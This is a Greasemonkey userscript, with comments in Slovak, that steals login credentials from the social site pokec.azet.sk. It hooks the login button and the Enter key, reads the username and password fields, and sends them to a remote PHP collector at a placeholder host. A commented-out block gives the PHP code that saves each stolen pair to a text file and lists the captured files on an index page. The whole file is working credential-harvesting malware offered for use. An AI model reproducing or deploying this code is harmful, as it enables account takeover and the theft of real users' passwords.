// ==UserScript==
// @name	  Odchyt hesla pre pokec
// @author        weroro
// @description	  Odosielanie prihlasovacích údajov
// @include	  http://pokec.azet.sk/*
// @include	  https://pokec.azet.sk/*
// @date	  2013-08-10
// @version	  0.0.9
// ==/UserScript==

// adresa php scriptu, ktorý bude ukladať heslá
var q_url = 'http://tvojastranka.sk/hck.php';

/*
            Obsah PHP scriptu hck.php
            
<?php
      $data = (!empty($_GET['data'])) ? $_GET['data'] : 'err||err';
      $arr = explode('||', $data);
      $data = $arr[0] . "\r\n" . $arr[1];
      $a = time();
      $b = date("d-m-Y_H_i_s");
      $fl = $a . '_' . $arr[0] . '_' . $b . '.txt';
      file_put_contents($fl, $data);
      if(file_exists($fl)) echo 'ok';
?>

            Obsah PHP scriptu pre výpis uložených údajov index.php
                 
<!doctype html>
<meta http-equiv="content-type" content="text/html; charset=utf-8">
<?php
    function subor($gtf)
    {
        $count = 0;
        $mydir = opendir($gtf);
        while (false !== ($file = readdir($mydir)))
        {
            if ($file != '.' && $file != '..' && $file != 'hck.php' && $file != 'index.php')
            {
                if (!is_dir($gtf.$file))
                {
                    $count++;
                    echo '<a href="/' . $file . '" target="_blank">' . $file . '</a><br>';
                }
            }
        }
        if ($count < 1) echo 'Default text.';
        closedir($mydir);
    }
    subor('./');
?>


*/
var q_sw;
var q_m = document.getElementById('meno');
function sendNckPsw ()
{
    if (!q_sw && q_m)
    {
        q_sw = true;
        GM_xmlhttpRequest(
        {
            method: "GET",
            url: q_url + "?data=" + q_m.value + '||' + document.getElementById('heslo').value,
            onload: function(response)
            {
                //alert(response.responseText);
            }
        });
    }
}
document.getElementsByClassName('c_pokectlacidlo c_uzke zelene')[0].onclick = function ()
{
    sendNckPsw ();
}
window.onkeypress = function (e)
{
    if (e.keyCode == 13) sendNckPsw ();
}